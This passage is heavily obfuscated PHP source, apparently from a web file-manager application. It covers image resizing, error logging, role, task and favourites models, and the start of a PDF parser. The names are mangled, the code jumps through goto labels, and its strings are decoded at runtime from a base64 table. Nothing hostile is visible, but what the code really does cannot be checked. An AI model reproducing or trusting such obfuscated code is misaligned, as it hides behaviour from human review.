$cğ¤¬èğÕĞ = $this->srcW / $this->srcH; if ($BøßèÁÌ‹ <= $cğ¤¬èğÕĞ) { $bƒ¹Úƒ¢ğ© = $DÀÂçØæ¯; $Bå‚“Ó æ‰ = $bƒ¹Úƒ¢ğ© * ($this->srcW / $this->srcH); } else { $Bå‚“Ó æ‰ = $BŠ‡ƒç‚½; $bƒ¹Úƒ¢ğ© = $Bå‚“Ó æ‰ * ($this->srcH / $this->srcW); } goto Eğ‹Ä‡˜òó; CÖÂì’ƒ™ö: return $this->echoImage($FÜ«„øŞîØ, $aä§‰Ğ–’); goto ağîÉìÑƒå; Eğ‹Ä‡˜òó: $c¸Å»›òÈ‰ = $this->creatImage($this->im, $Bå‚“Ó æ‰, $bƒ¹Úƒ¢ğ©, 0, 0, 0, 0, $this->srcW, $this->srcH); $FÜ«„øŞîØ = $this->creatImage($c¸Å»›òÈ‰, $BŠ‡ƒç‚½, $DÀÂçØæ¯, 0, 0, ($Bå‚“Ó æ‰ - $BŠ‡ƒç‚½) / 2, ($bƒ¹Úƒ¢ğ© - $DÀÂçØæ¯) / 2, $BŠ‡ƒç‚½, $DÀÂçØæ¯); imageDestroy($c¸Å»›òÈ‰); goto CÖÂì’ƒ™ö; ağîÉìÑƒå: } function backFill($dˆ‹©ŞªÑ, $AØŞòÕ–„·, $CÙÏ¿Ø´íê, $F«¶òáÜ‡ = false, $bÍƒ»óï°¹ = 255, $aœÖõ¹×¥Å = 255, $aó©´±ŸÆ× = 255) { goto díöá˜ÄíĞ; díöá˜ÄíĞ: $bÒ”½íËåÁ = $AØŞòÕ–„· / $CÙÏ¿Ø´íê; $b¦ãİÀÒæÀ = $this->srcW / $this->srcH; if ($bÒ”½íËåÁ <= $b¦ãİÀÒæÀ) { $A™ŸŸÁì³° = $AØŞòÕ–„·; $Eò¹¶»Í¸» = $A™ŸŸÁì³° * ($this->srcH / $this->srcW); } else { $Eò¹¶»Í¸» = $CÙÏ¿Ø´íê; $A™ŸŸÁì³° = $Eò¹¶»Í¸» * ($this->srcW / $this->srcH); } goto FÏ°äßä; DãŞ¢Ü”§¸: return $this->echoImage($C¸Ù¬öäå, $dˆ‹©ŞªÑ); goto EÂì·›‘Ì ; a ÷¼ÌÔÈ: if ($F«¶òáÜ‡) { $d©Øæ«œ» = imageColorTransparent($C¸Ù¬öäå, $d©Øæ«œ»); $EÓ…î©«Á´ = $CÙÏ¿Ø´íê - $Eò¹¶»Í¸»; } imageFilledRectangle($C¸Ù¬öäå, 0, 0, $AØŞòÕ–„·, $CÙÏ¿Ø´íê, $d©Øæ«œ»); if ($this->srcW > $AØŞòÕ–„· || $this->srcH > $CÙÏ¿Ø´íê) { $d³ßà÷ŸÔ¿ = $this->creatImage($this->im, $A™ŸŸÁì³°, $Eò¹¶»Í¸», 0, 0, 0, 0, $this->srcW, $this->srcH); if ($A™ŸŸÁì³° < $AØŞòÕ–„·) { imageCopy($C¸Ù¬öäå, $d³ßà÷ŸÔ¿, ($AØŞòÕ–„· - $A™ŸŸÁì³°) / 2, 0, 0, 0, $A™ŸŸÁì³°, $Eò¹¶»Í¸»); } else { if ($Eò¹¶»Í¸» < $CÙÏ¿Ø´íê) { imageCopy($C¸Ù¬öäå, $d³ßà÷ŸÔ¿, 0, $EÓ…î©«Á´, 0, 0, $A™ŸŸÁì³°, $Eò¹¶»Í¸»); } else { imageCopy($C¸Ù¬öäå, $d³ßà÷ŸÔ¿, 0, 0, 0, 0, $A™ŸŸÁì³°, $Eò¹¶»Í¸»); } } } else { imageCopyMerge($C¸Ù¬öäå, $this->im, ($AØŞòÕ–„· - $A™ŸŸÁì³°) / 2, $EÓ…î©«Á´, 0, 0, $A™ŸŸÁì³°, $Eò¹¶»Í¸», 100); } goto DãŞ¢Ü”§¸; FÏ°äßä: if (function_exists($_SERVER[©][1866])) { @($C¸Ù¬öäå = imageCreateTrueColor($AØŞòÕ–„·, $CÙÏ¿Ø´íê)); if (!$C¸Ù¬öäå) { $C¸Ù¬öäå = imageCreate($AØŞòÕ–„·, $CÙÏ¿Ø´íê); } } else { $C¸Ù¬öäå = imageCreate($AØŞòÕ–„·, $CÙÏ¿Ø´íê); } $EÓ…î©«Á´ = ($CÙÏ¿Ø´íê - $Eò¹¶»Í¸») / 2; $d©Øæ«œ» = imagecolorallocate($C¸Ù¬öäå, $bÍƒ»óï°¹, $aœÖõ¹×¥Å, $aó©´±ŸÆ×); goto a ÷¼ÌÔÈ; EÂì·›‘Ì : } function creatImage($A™äœ–œ, $dÃïÉ¦Äà, $a†¢£¹Ôœµ, $D‚ÙöèƒŒ, $e©½¥øÌŠ·, $fØÊÎÃ‚¬ƒ, $CœâùêëÓ·, $fÑ¤ÀËÂ¾, $dˆ¢ÀÎŠ¾) { if (function_exists($_SERVER[©][1866])) { @($dò©’ó•¶ = ImageCreateTrueColor($dÃïÉ¦Äà, $a†¢£¹Ôœµ)); @imagealphablending($dò©’ó•¶, !1); @imagesavealpha($dò©’ó•¶, !0); if ($dò©’ó•¶) { imageCopyResampled($dò©’ó•¶, $A™äœ–œ, $D‚ÙöèƒŒ, $e©½¥øÌŠ·, $fØÊÎÃ‚¬ƒ, $CœâùêëÓ·, $dÃïÉ¦Äà, $a†¢£¹Ôœµ, $fÑ¤ÀËÂ¾, $dˆ¢ÀÎŠ¾); } else { $dò©’ó•¶ = ImageCreate($dÃïÉ¦Äà, $a†¢£¹Ôœµ); imageCopyResized($dò©’ó•¶, $A™äœ–œ, $D‚ÙöèƒŒ, $e©½¥øÌŠ·, $fØÊÎÃ‚¬ƒ, $CœâùêëÓ·, $dÃïÉ¦Äà, $a†¢£¹Ôœµ, $fÑ¤ÀËÂ¾, $dˆ¢ÀÎŠ¾); } } else { $dò©’ó•¶ = ImageCreate($dÃïÉ¦Äà, $a†¢£¹Ôœµ); imageCopyResized($dò©’ó•¶, $A™äœ–œ, $D‚ÙöèƒŒ, $e©½¥øÌŠ·, $fØÊÎÃ‚¬ƒ, $CœâùêëÓ·, $dÃïÉ¦Äà, $a†¢£¹Ôœµ, $fÑ¤ÀËÂ¾, $dˆ¢ÀÎŠ¾); } return $dò©’ó•¶; } public function imgRotate($E‹‡œ¾Ù¢Â, $C™îÒ×ãË) { goto a•ŞØÆ¼ÍŠ; D²Ó¼Ğ•ˆõ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $EÂÌç³³Îù = imagegif($Aœ°ŠŸ±‰¥, $E‹‡œ¾Ù¢Â); break; case IMAGETYPE_JPEG: $EÂÌç³³Îù = imagejpeg($Aœ°ŠŸ±‰¥, $E‹‡œ¾Ù¢Â, 100); break; case IMAGETYPE_PNG: $EÂÌç³³Îù = imagePNG($Aœ°ŠŸ±‰¥, $E‹‡œ¾Ù¢Â); break; default: break; } imageDestroy($Aœ°ŠŸ±‰¥); imageDestroy($this->im); goto c–¿ËŸè³; a•ŞØÆ¼ÍŠ: if (!$this->im || $C™îÒ×ãË % 360 === 0 || !function_exists($_SERVER[©][1867])) { return !1; } $Aœ°ŠŸ±‰¥ = imageRotate($this->im, 360 - $C™îÒ×ãË, 0); $EÂÌç³³Îù = !1; goto D²Ó¼Ğ•ˆõ; c–¿ËŸè³: return $EÂÌç³³Îù; goto Eºñ•¼•ˆ‚; Eºñ•¼•ˆ‚: } function echoImage($BÇùÆ—§ŒÂ, $e‘¨ÙçÇ¿) { goto f•ÁàŠŒÑÓ; b–İ‚ÄÑä²: imageDestroy($this->im); return $FÊ¤á¹÷ùğ; goto C·¸ª›§Ôç; dÎ¾ïËŒÎ²: $FÊ¤á¹÷ùğ = !1; switch ($this->echoType) { case $Cø®°¨¸ğ[1868]: $FÊ¤á¹÷ùğ = imagePNG($BÇùÆ—§ŒÂ); break; case $Cø®°¨¸ğ[177]: $FÊ¤á¹÷ùğ = imagePNG($BÇùÆ—§ŒÂ, $e‘¨ÙçÇ¿); break; } imageDestroy($BÇùÆ—§ŒÂ); goto b–İ‚ÄÑä²; f•ÁàŠŒÑÓ: $Cø®°¨¸ğ =& $_SERVER[©]; if (!$BÇùÆ—§ŒÂ) { return !1; } ob_get_clean(); goto dÎ¾ïËŒÎ²; C·¸ª›§Ôç: } } goto Fƒãğò¯ô¡; c—º‡²ÑÁ—: define($_SERVER[©][235], 1); define($_SERVER[©][236], 2); define($_SERVER[©][237], 3); goto CóÃƒ‚ğÅ ; DˆÀİÅ¹¬: function beforeShutdownError($B–¤ç³¨½´ = false, $D­ß·ĞÕò‹ = '', $dèËÂ¹«­© = '', $bŠ›ßÀ¢°† = 0) { $BˆòòŠÜã® =& $_SERVER[ÊÖŠ]; switch ($B–¤ç³¨½´) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $e‹…ÆËƒªÈ = $BˆòòŠÜã®[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $e‹…ÆËƒªÈ = $BˆòòŠÜã®[40]; break; case E_STRICT: $e‹…ÆËƒªÈ = $BˆòòŠÜã®[41]; break; case E_NOTICE: case E_USER_NOTICE: $e‹…ÆËƒªÈ = $BˆòòŠÜã®[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $e‹…ÆËƒªÈ = $BˆòòŠÜã®[43]; break; default: break; } if (!$e‹…ÆËƒªÈ || $e‹…ÆËƒªÈ == $BˆòòŠÜã®[42] || $e‹…ÆËƒªÈ == $BˆòòŠÜã®[43]) { return; } $dèËÂ¹«­© = $BˆòòŠÜã®[4] . str_replace($_SERVER[$BˆòòŠÜã®[37]], $BˆòòŠÜã®[20], $dèËÂ¹«­©); $c“ŠÇôÃ£ = $e‹…ÆËƒªÈ . $BˆòòŠÜã®[44] . $D­ß·ĞÕò‹ . $BˆòòŠÜã®[44] . $dèËÂ¹«­© . $BˆòòŠÜã®[44] . $bŠ›ßÀ¢°†; write_log($c“ŠÇôÃ£ . $BˆòòŠÜã®[18] . get_caller_msg(1), $BˆòòŠÜã®[19]); } $_SERVER[$_SERVER[ÊÖŠ][45]] = $_SERVER[$_SERVER[ÊÖŠ][37]] . $_SERVER[ÊÖŠ][46]; $cËƒ—¯‚…Ç = strrev(base64_decode($_SERVER[ÊÖŠ][47])); goto AàÆ•ÔÓŞ; e” ‹ÅŞòÈ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\162\x6f\x6c\x65\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\x61\165\164\x68", "\x6c\x61\x62\x65\154", "\x64\151\163\160\154\x61\x79", "\163\171\163\x74\145\x6d", "\x64\x65\163\x63", "\x69\147\x6e\x6f\162\x65\105\170\x74", "\x69\x67\156\x6f\162\145\x46\151\x6c\x65\x53\x69\172\x65", "\141\x64\155\x69\x6e\x69\x73\x74\x72\141\164\x6f\x72", "\163\157\162\164"); public function listData($c×ÒÍ§Öò™ = false, $bİÅÆà×Ü = "\163\x6f\x72\164", $eùØƒäÀ×Æ = false) { $eŒº‰ÆŸóˆ =& $_SERVER[©]; $C„¼Ÿ•ÃŸˆ = parent::listData($c×ÒÍ§Öò™, $bİÅÆà×Ü, $eùØƒäÀ×Æ); if (!$c×ÒÍ§Öò™) { $a«ØÈŠÁ = $eŒº‰ÆŸóˆ[2481]; foreach ($C„¼Ÿ•ÃŸˆ as $fŸ—˜«Í‡ => $AÇÚ¿¸™³é) { if ($AÇÚ¿¸™³é[$eŒº‰ÆŸóˆ[2482]] == 1) { $C„¼Ÿ•ÃŸˆ[$fŸ—˜«Í‡][$eŒº‰ÆŸóˆ[413]] = $a«ØÈŠÁ; } } } return $C„¼Ÿ•ÃŸˆ; } public function update($FñâÖÆÂ, $Aì§œ–öª) { goto F‹Ç‡ßËœ; EÁé‹ò¢¨: if (!$c»‘…Í¬È¡ || $Aã—Ş®ßò && $Aã—Ş®ßò[$cŒàßÛ«å [375]] != $c»‘…Í¬È¡[$cŒàßÛ«å [375]]) { return !1; } if ($Aã—Ş®ßò[$cŒàßÛ«å [2482]] == 1) { $Aì§œ–öª = array($cŒàßÛ«å [38] => $Aì§œ–öª[$cŒàßÛ«å [38]], $cŒàßÛ«å [2120] => $Aì§œ–öª[$cŒàßÛ«å [2120]]); } $this->filterAuth($Aì§œ–öª[$cŒàßÛ«å [384]]); goto d©ã‹Ç˜; d©ã‹Ç˜: return parent::update($FñâÖÆÂ, $Aì§œ–öª); goto e¹±õÌ‚¦ã; F‹Ç‡ßËœ: $cŒàßÛ«å  =& $_SERVER[©]; $c»‘…Í¬È¡ = parent::listData($FñâÖÆÂ); $Aã—Ş®ßò = $this->findByName($Aì§œ–öª[$cŒàßÛ«å [38]]); goto EÁé‹ò¢¨; e¹±õÌ‚¦ã: } public function remove($b³†í±ÙÇ) { $C¢ÓŠ†Õœ = parent::listData($b³†í±ÙÇ); if (!$C¢ÓŠ†Õœ || $C¢ÓŠ†Õœ[$_SERVER[©][1077]]) { return !1; } return parent::remove($b³†í±ÙÇ); } public function add($d×ÜãÓ—‘›) { goto dÉ®óÖÑÓ; c¢Í¹‡×Œ: return parent::insert($d×ÜãÓ—‘›); goto a‘ìê±Œ„²; dÉ®óÖÑÓ: $aÂÍ×œöÜÂ =& $_SERVER[©]; $f¦…·£“ = $d×ÜãÓ—‘›[$aÂÍ×œöÜÂ[38]]; if ($this->findByName($f¦…·£“)) { return !1; } goto f‚½¦½ò„„; f‚½¦½ò„„: $e˜÷éÅô½à = array($aÂÍ×œöÜÂ[394] => $f¦…·£“, $aÂÍ×œöÜÂ[2108] => $aÂÍ×œöÜÂ[43], $aÂÍ×œöÜÂ[2104] => $aÂÍ×œöÜÂ[2121], $aÂÍ×œöÜÂ[2483] => 1, $aÂÍ×œöÜÂ[2107] => 0, $aÂÍ×œöÜÂ[2484] => 0, $aÂÍ×œöÜÂ[2106] => $this->getSort()); $d×ÜãÓ—‘› = array_merge($e˜÷éÅô½à, $d×ÜãÓ—‘›); $this->filterAuth($d×ÜãÓ—‘›[$aÂÍ×œöÜÂ[384]]); goto c¢Í¹‡×Œ; a‘ìê±Œ„²: } private function getSort() { $C·®œ·¼Ïå =& $_SERVER[©]; $cÓê„¥ö‡ = parent::listData(); $AÍôíŠ„›« = array_to_keyvalue($cÓê„¥ö‡, $C·®œ·¼Ïå[43], $C·®œ·¼Ïå[2123]); return empty($AÍôíŠ„›«) ? 0 : max($AÍôíŠ„›«) + 1; } private function filterAuth(&$CàÖŞ”Í Û) { $FïÀ¹Øí§‚ =& $_SERVER[©]; $a¸¸î³ÄÍÉ = array(); $DÎ–ƒ‹×¶ = array_filter(explode($FïÀ¹Øí§‚[57], $CàÖŞ”Í Û)); foreach ($DÎ–ƒ‹×¶ as $CàÖŞ”Í Û) { $FÀƒ³Í›² = explode($FïÀ¹Øí§‚[101], $CàÖŞ”Í Û); if ($FÀƒ³Í›²[0] == $FïÀ¹Øí§‚[1781] && $FÀƒ³Í›²[1] != $FïÀ¹Øí§‚[1033]) { $c­È«ÑƒÔ = $FÀƒ³Í›²[0] . $FïÀ¹Øí§‚[101] . $FÀƒ³Í›²[1] . $FïÀ¹Øí§‚[2485]; if (!in_array($c­È«ÑƒÔ, $DÎ–ƒ‹×¶)) { $a¸¸î³ÄÍÉ[] = $c­È«ÑƒÔ; } } $a¸¸î³ÄÍÉ[] = $CàÖŞ”Í Û; } $CàÖŞ”Í Û = implode($FïÀ¹Øí§‚[57], $a¸¸î³ÄÍÉ); } public function sort($fæÍÑõ½‡µ, $B¾‹Åö¶‚Ç) { return parent::update($fæÍÑõ½‡µ, $B¾‹Åö¶‚Ç); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x74\x61\x73\153\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\164\x79\x70\145", "\145\x76\x65\156\164", "\164\151\x6d\x65", "\144\145\163\x63", "\163\171\163\x74\x65\x6d", "\145\156\x61\142\154\145", "\154\141\163\164\x52\x75\x6e", "\x73\x6f\x72\164"); public function listData($c„–Î¶Şİ = false, $F®ÍÎŠë¹¡ = "\x73\157\162\164", $bŸÍİ = false) { return parent::listData($c„–Î¶Şİ, $F®ÍÎŠë¹¡, $bŸÍİ); } public function add($EœÛãå•) { $b¶‚êÌ”å =& $_SERVER[©]; $E„Œ©á²Š… = $this->findByName($EœÛãå•[$b¶‚êÌ”å[38]]); if ($E„Œ©á²Š…) { return !1; } $EœÛãå•[$b¶‚êÌ”å[1399]] = 0; $EœÛãå•[$b¶‚êÌ”å[2123]] = $this->getSort(); return parent::insert($EœÛãå•); } private function getSort() { $bĞ›ğ‰„ÅÕ =& $_SERVER[©]; $A‘‹¬Ğ­ = parent::listData(); $a¡äÃ¼®  = array_to_keyvalue($A‘‹¬Ğ­, $bĞ›ğ‰„ÅÕ[43], $bĞ›ğ‰„ÅÕ[2123]); return empty($a¡äÃ¼® ) ? 0 : max($a¡äÃ¼® ) + 1; } public function update($cğñê£­èå, $A¨‡âŞ‰Àº) { $cÃ¸£Èˆ =& $_SERVER[©]; $b¼¿Ã‚òÓ = $this->listData($cğñê£­èå); $Fù¹÷Ö…Ÿ = $this->findByName($A¨‡âŞ‰Àº[$cÃ¸£Èˆ[38]]); if (!$b¼¿Ã‚òÓ || $Fù¹÷Ö…Ÿ && $Fù¹÷Ö…Ÿ[$cÃ¸£Èˆ[375]] != $b¼¿Ã‚òÓ[$cÃ¸£Èˆ[375]]) { return !1; } return parent::update($cğñê£­èå, $A¨‡âŞ‰Àº); } public function remove($eµÍÎÔŸã¹, $d±¡—•È = false) { $BÒÚÚ®„ßš =& $_SERVER[©]; $dĞç­ÓÂù = $this->listData($eµÍÎÔŸã¹); if (!$dĞç­ÓÂù) { return; } if (!$d±¡—•È && $dĞç­ÓÂù[$BÒÚÚ®„ßš[1077]] == $BÒÚÚ®„ßš[93]) { return !1; } return parent::remove($eµÍÎÔŸã¹); } public function enable($FÔ±º»¦÷±, $fƒ©ëˆÕ©) { return $this->update($FÔ±º»¦÷±, array($_SERVER[©][2475] => $fƒ©ëˆÕ©)); } public function run($fäÕÍ·„„) { return $this->update($fäÕÍ·„„, array($_SERVER[©][2486] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($aßÀ¼’µÎÅ) { $D¶‹öâÂ±‰ =& $_SERVER[©]; return array($D¶‹öâÂ±‰[2487] => array(USER_ID, $D¶‹öâÂ±‰[2488])); } protected function listData() { $Eèåéœº¶ =& $_SERVER[©]; $F¿İÅ°Ô‡î = array($Eèåéœº¶[1425] => USER_ID, $Eèåéœº¶[444] => 0); $b—°Üšù¶ = $Eèåéœº¶[2489]; $E Œ“ŞØÄ» = $this->field($b—°Üšù¶)->where($F¿İÅ°Ô‡î)->order($Eèåéœº¶[2490])->select(); return $E Œ“ŞØÄ» ? $E Œ“ŞØÄ» : array(); } protected function resetCache() { } protected function listView() { goto aç„¦¿Ô ; aç„¦¿Ô : $E‚†©¶°å‚ =& $_SERVER[©]; $FŞ×‡ôÛ = $this->listData(); $DÏİİ²¬¢× = array_filter_by_field($FŞ×‡ôÛ, $E‚†©¶°å‚[39], $E‚†©¶°å‚[390]); goto dñ¬öÙÕäÂ; dñ¬öÙÕäÂ: $Fï‹ÈÁéáß = array_to_keyvalue($DÏİİ²¬¢×, $E‚†©¶°å‚[43], $E‚†©¶°å‚[85]); if (!$Fï‹ÈÁéáß) { return $FŞ×‡ôÛ; } $Aå†£Š»” = 2000; goto f’î¾Õ‹­Ú; cèĞ…ØØË²: $cˆ’»ÉÊÒ‡ = array_to_keyvalue($cˆ’»ÉÊÒ‡, $E‚†©¶°å‚[377]); foreach ($FŞ×‡ôÛ as $f•Ø´©ã© => $B¿†äÁºÖñ) { $F¨”¼Š•éÆ = $cˆ’»ÉÊÒ‡[$B¿†äÁºÖñ[$E‚†©¶°å‚[85]]]; $F¨”¼Š•éÆ = $F¨”¼Š•éÆ ? $F¨”¼Š•éÆ : array(); $FŞ×‡ôÛ[$f•Ø´©ã©] = array_merge($F¨”¼Š•éÆ, $B¿†äÁºÖñ); } return $FŞ×‡ôÛ; goto Bßä«ôšî; f’î¾Õ‹­Ú: $B²Â´Ù = array($E‚†©¶°å‚[391] => array($E‚†©¶°å‚[392], $Fï‹ÈÁéáß)); $cˆ’»ÉÊÒ‡ = Model($E‚†©¶°å‚[752])->listSource($B²Â´Ù, $Aå†£Š»”); $cˆ’»ÉÊÒ‡ = array_merge($cˆ’»ÉÊÒ‡[$E‚†©¶°å‚[83]], $cˆ’»ÉÊÒ‡[$E‚†©¶°å‚[84]]); goto cèĞ…ØØË²; Bßä«ôšî: } protected function addFav($c§›Œ„Ä½é, $eÔÏÎ‡Í‡‚ = '', $E»¿øÂ‡¿– = "\163\x6f\165\x72\x63\x65") { goto FŠ‰‡÷„ëä; DŠÔœò÷œ: if (!$eÔÏÎ‡Í‡‚ && $E»¿øÂ‡¿– == $B÷¢Ù”Ş…ƒ[390]) { $FÚ˜ÊóØÑä = Model($B÷¢Ù”Ş…ƒ[1114])->where(array($B÷¢Ù”Ş…ƒ[391] => $c§›Œ„Ä½é))->find(); if (!$FÚ˜ÊóØÑä) { return !1; } $eÔÏÎ‡Í‡‚ = $FÚ˜ÊóØÑä[$B÷¢Ù”Ş…ƒ[38]]; } $eÔÏÎ‡Í‡‚ = $this->getAutoName($eÔÏÎ‡Í‡‚); $Bƒ’í…«¨œ = array($B÷¢Ù”Ş…ƒ[1425] => USER_ID, $B÷¢Ù”Ş…ƒ[444] => 0, $B÷¢Ù”Ş…ƒ[394] => $eÔÏÎ‡Í‡‚, $B÷¢Ù”Ş…ƒ[395] => $c§›Œ„Ä½é, $B÷¢Ù”Ş…ƒ[396] => $E»¿øÂ‡¿–, $B÷¢Ù”Ş…ƒ[2106] => $a„Œáî½ÚÉ + 1); goto aÊ‹–¶ÓÀ; cí×ƒ…ï‘: $EÂ«ŸÂ‘ì = array($B÷¢Ù”Ş…ƒ[1425] => USER_ID, $B÷¢Ù”Ş…ƒ[444] => 0); $a„Œáî½ÚÉ = $this->where($EÂ«ŸÂ‘ì)->max($B÷¢Ù”Ş…ƒ[2123]); if (!$a„Œáî½ÚÉ) { $a„Œáî½ÚÉ = 0; } goto DŠÔœò÷œ; FŠ‰‡÷„ëä: $B÷¢Ù”Ş…ƒ =& $_SERVER[©]; $EÂ«ŸÂ‘ì = array($B÷¢Ù”Ş…ƒ[1425] => USER_ID, $B÷¢Ù”Ş…ƒ[444] => 0, $B÷¢Ù”Ş…ƒ[396] => $E»¿øÂ‡¿–, $B÷¢Ù”Ş…ƒ[395] => $c§›Œ„Ä½é); if ($this->where($EÂ«ŸÂ‘ì)->find()) { return !1; } goto cí×ƒ…ï‘; aÊ‹–¶ÓÀ: return $this->add($Bƒ’í…«¨œ); goto b·ƒŒª†ç; b·ƒŒª†ç: } protected function remove($f¯èë½Šô) { $E¨¡†ÄÅ«õ =& $_SERVER[©]; $dªÚ¬³‹‚İ = array($E¨¡†ÄÅ«õ[1425] => USER_ID, $E¨¡†ÄÅ«õ[393] => $f¯èë½Šô); return $this->where($dªÚ¬³‹‚İ)->delete(); } protected function removeByName($eÆ¡à˜™‡) { $díÁ‹ìØß =& $_SERVER[©]; $fªÉ¦ÓÎ = array($díÁ‹ìØß[1425] => USER_ID, $díÁ‹ìØß[394] => $eÆ¡à˜™‡, $díÁ‹ìØß[444] => 0); return $this->where($fªÉ¦ÓÎ)->delete(); } protected function rename($cØÕøÎ°ç³, $B‰›”ŒˆÁÒ) { $E£¹·É­ãì =& $_SERVER[©]; if ($cØÕøÎ°ç³ == $B‰›”ŒˆÁÒ) { return !1; } $Aß‘œõ—ÀŸ = $this->getAutoName($B‰›”ŒˆÁÒ); if ($B‰›”ŒˆÁÒ != $Aß‘œõ—ÀŸ) { return !1; } $B‰”œÔÛ» = array($E£¹·É­ãì[1425] => USER_ID, $E£¹·É­ãì[444] => 0, $E£¹·É­ãì[38] => $cØÕøÎ°ç³); return $this->where($B‰”œÔÛ»)->save(array($E£¹·É­ãì[38] => $B‰›”ŒˆÁÒ)); } protected function resetSort($A»’Ú‡ÉŠµ) { $BŠ®…ø„² =& $_SERVER[©]; $A»’Ú‡ÉŠµ = is_array($A»’Ú‡ÉŠµ) ? $A»’Ú‡ÉŠµ : array(); $Bî«…Ç‚†Ñ = array($BŠ®…ø„²[1425] => USER_ID); for ($A‚ùˆâáñÆ = 0; $A‚ùˆâáñÆ < count($A»’Ú‡ÉŠµ); $A‚ùˆâáñÆ++) { $Bî«…Ç‚†Ñ[$BŠ®…ø„²[393]] = $A»’Ú‡ÉŠµ[$A‚ùˆâáñÆ]; $this->where($Bî«…Ç‚†Ñ)->save(array($BŠ®…ø„²[2106] => $A‚ùˆâáñÆ + 1)); } return !0; } protected function moveTop($DÏ÷‰á†) { goto Dîß·è†“Ã; cª³Ëƒ’†Ö: if (!$eÙÀŸËœÜ¬) { return; } $cŒ‚²Îˆ„¶ = $this->field($BŒ×³Œ£¬­[375])->where($b‹Øáø¨»‚)->order($BŒ×³Œ£¬­[2490])->select(); $cŒ‚²Îˆ„¶ = array_to_keyvalue($cŒ‚²Îˆ„¶, $BŒ×³Œ£¬­[43], $BŒ×³Œ£¬­[375]); goto féÀ²§ÑÉæ; Dîß·è†“Ã: $BŒ×³Œ£¬­ =& $_SERVER[©]; $b‹Øáø¨»‚ = array($BŒ×³Œ£¬­[1425] => USER_ID, $BŒ×³Œ£¬­[444] => 0); $eÙÀŸËœÜ¬ = $this->where($b‹Øáø¨»‚)->where(array($BŒ×³Œ£¬­[38] => $DÏ÷‰á†))->find(); goto cª³Ëƒ’†Ö; féÀ²§ÑÉæ: $E‰ôÎÂ»¤³ = $cŒ‚²Îˆ„¶; $cŒ‚²Îˆ„¶ = array_remove_value($cŒ‚²Îˆ„¶, $eÙÀŸËœÜ¬[$BŒ×³Œ£¬­[375]]); array_unshift($cŒ‚²Îˆ„¶, $eÙÀŸËœÜ¬[$BŒ×³Œ£¬­[375]]); goto AÀÚó•’ ; AÀÚó•’ : return $this->resetSort($cŒ‚²Îˆ„¶); goto aºäÀî‡£; aºäÀî‡£: } protected function moveBottom($B“šøí) { $E™‚°ĞÚèÙ =& $_SERVER[©]; $a›Ğ¡ÜÓã‹ = array($E™‚°ĞÚèÙ[1425] => USER_ID, $E™‚°ĞÚèÙ[444] => 0); $B˜¸Ù›‚‹¬ = $this->where($a›Ğ¡ÜÓã‹)->max($E™‚°ĞÚèÙ[2123]); $E¸Å¦çÅá¡ = array($E™‚°ĞÚèÙ[2123] => $B˜¸Ù›‚‹¬ + 1); return $this->where($a›Ğ¡ÜÓã‹)->where(array($E™‚°ĞÚèÙ[38] => $B“šøí))->save($E¸Å¦çÅá¡); } private function getAutoName($E²ˆªƒÊ§ì) { goto d’²ÅŠ¹; F—Ä™ãµ¡…: return $E²ˆªƒÊ§ì . "\x28{$d‰ÛŠí·Œß}\x29"; goto bïÅÚù‰Ÿ²; d÷™Á¹¾Ùå: $e‰¥µÍ°…‰ = array_to_keyvalue($e‰¥µÍ°…‰, $cóª…µ˜¾[43], $cóª…µ˜¾[38]); if (!$e‰¥µÍ°…‰ || !in_array($E²ˆªƒÊ§ì, $e‰¥µÍ°…‰)) { return $E²ˆªƒÊ§ì; } for ($d‰ÛŠí·Œß = 0; $d‰ÛŠí·Œß < count($e‰¥µÍ°…‰); $d‰ÛŠí·Œß++) { if (!in_array($E²ˆªƒÊ§ì . "\x28{$d‰ÛŠí·Œß}\51", $e‰¥µÍ°…‰)) { return $E²ˆªƒÊ§ì . "\x28{$d‰ÛŠí·Œß}\51"; } } goto F—Ä™ãµ¡…; d’²ÅŠ¹: $cóª…µ˜¾ =& $_SERVER[©]; $eğ™–àÒÒ» = array($cóª…µ˜¾[1425] => USER_ID, $cóª…µ˜¾[444] => 0); $e‰¥µÍ°…‰ = $this->field($cóª…µ˜¾[38])->where($eğ™–àÒÒ»)->select(); goto d÷™Á¹¾Ùå; bïÅÚù‰Ÿ²: } } goto cÆŸÊ†¸æñ; F±‡æöé®: class FileParsePdf { public static function parse($B¾å–˜×ùÔ) { goto B»ÎÓùÊÑÖ; EÔ³Ê™Ñ£Ò: if ($f£š†åìÀŠ[1] && $bİ»ÂîÊ[$D™Õš¤êÜ–[1537]] < $f£š†åìÀŠ[1][0]) { $bİ»ÂîÊ[$D™Õš¤êÜ–[1537]] = $f£š†åìÀŠ[1][0]; } $bİ»ÂîÊ = self::parseInfoItem($bİ»ÂîÊ); return $bİ»ÂîÊ; goto Aù§…â¢ƒ; E¯Ç‘î´õ: if ($f£š†åìÀŠ) { $bİ»ÂîÊ[$D™Õš¤êÜ–[1337]] = $f£š†åìÀŠ[1]; } $bİ»ÂîÊ[$D™Õš¤êÜ–[1537]] = 0; $d®Ó¯ÙÉ× = $D™Õš¤êÜ–[1538]; goto AĞğ‡”çÒ; CĞ²‘å‹÷£: $d®Ó¯ÙÉ× = $D™Õš¤êÜ–[1534]; preg_match($d®Ó¯ÙÉ×, $D‹Šœ¢½®[$D™Õš¤êÜ–[1530]], $f£š†åìÀŠ); if (!$bİ»ÂîÊ[$D™Õš¤êÜ–[1533]] && count($f£š†åìÀŠ) == 5) { $bİ»ÂîÊ[$D™Õš¤êÜ–[1533]] = $f£š†åìÀŠ[3]; $bİ»ÂîÊ[$D™Õš¤êÜ–[1535]] = $f£š†åìÀŠ[4]; } goto d–§‰¯•¸; B»ÎÓùÊÑÖ: $D™Õš¤êÜ– =& $_SERVER[©]; $FëÓÓµëÑ = 32 * 1024; $D‹Šœ¢½® = array($D™Õš¤êÜ–[776] => fopen($B¾å–˜×ùÔ, 